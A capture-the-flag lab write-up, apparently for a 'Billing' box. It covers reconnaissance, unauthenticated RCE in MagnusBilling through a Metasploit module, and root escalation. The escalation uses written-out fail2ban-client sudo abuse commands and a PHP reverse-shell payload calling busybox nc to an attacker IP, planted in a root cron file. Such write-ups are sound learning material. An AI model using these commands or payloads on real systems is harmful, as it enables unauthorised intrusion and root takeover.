
1. Basic nmap scan for discovery
<img width="638" height="297" alt="image" src="https://github.com/user-attachments/assets/bf8f16f6-8f9a-4a5a-8276-f5bc48831fd8" />

2. Fuzzing directories with ffuf
<img width="853" height="409" alt="image" src="https://github.com/user-attachments/assets/17887601-050a-493d-9c07-face8b82ad1d" />

<img width="853" height="560" alt="image" src="https://github.com/user-attachments/assets/0791fea6-9092-41f3-ac6c-9bec985e9480" />

3. Thought there was something in the login page, but appeared to be same error no matter the username:
<img width="462" height="395" alt="image" src="https://github.com/user-attachments/assets/a3eb64ff-3ff2-43b0-9298-1b4351fe907d" />

4. Tried burp suite, but didn't get very far here:


POST /mbilling/index.php/authentication/login HTTP/1.1
Host: 10.10.241.125
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:131.0) Gecko/20100101 Firefox/131.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
X-Requested-With: XMLHttpRequest
Content-Length: 65
Origin: http://10.10.241.125
Connection: keep-alive
Referer: http://10.10.241.125/mbilling/
Cookie: PHPSESSID=qslgufb4llhp4k0572i69flq07
Priority: u=0

user=admin&password=A94A8FE5CCB19BA61C4C0873D391E987982FBBD3&key=

5. Fumbled around fuzzing for a while with not much luck. Eventually ran another nmap scan and discovered a missed port:

<img width="573" height="390" alt="image" src="https://github.com/user-attachments/assets/f7117805-bb80-4eac-a97c-922c6adde787" />

Magnus Billing is opensource billing software that uses Asterisk. 
https://cve.mitre.org/cgi-bin/cvekey.cgi?keyword=asterisk
There are exploits for both Magnus and Asterisk, but there is a remote command execution for magnus through Metasploit that might work:
https://www.rapid7.com/db/modules/exploit/linux/http/magnusbilling_unauth_rce_cve_2023_30258/

Metasploit (exploit/linux/http/magnusbilling_unauth_rce_cve_2023_30258) worked and got user flag. I’m the ‘asterisk’ user. 
Other users: magnus, ssm-user, debian
no SUIDs
no writeable locations of use
no cron tab jobs
no password/token files
no file shares
no SSH keys
sudo -l : fail2ban-client

Tried going down a route with fail2ban other than getting a reverse shell as the same asterisk user. 

Googled fail2ban more and found this one that worked to copy the root.txt file to the /tmp folder:
https://vulners.com/packetstorm/PACKETSTORM:189989
    sudo /usr/bin/fail2ban-client restart
    sudo /usr/bin/fail2ban-client set sshd action iptables-multiport actionban "/bin/bash -c 'cat /root/root.txt > /tmp/root.txt && chmod 777 /tmp/root.txt'" 
    sudo /usr/bin/fail2ban-client set sshd banip 127.0.0.1

From what I understand, since user can run fail2ban-client with sudo, use it’s commands to execute your own command. In this case, you’re setting an action related to banning an ip and when that is executed, it will run the /bin/bash command to copy the file as root to a location the current user can read.

I still looked up some other write-ups to see if there were alternate ways of doing this and found:
https://domoon.medium.com/billing-thm-writeup-de780e9f8017
used ‘pspy64’ to see running processes and found a cron job running as root every minute. Had access to delete and recreate the file to get root
Cron runs this:
  sh -c php /var/www/html/mbilling/cron.php ..
viewed this: /var/www/html/mbilling/cron.php
cannot write to the file but own directory
give yourself permission to write to directory: 
  chmod +w /var/www/html/mbilling
Can’t write to cron.php, but can delete the file and create a new one
Wrote it with a PHP rev shell
  <?php
  exec("busybox nc <ATTACKER IP> 4001 -e bash");
  ?>
start netcat listener, Cron runs, user gets root


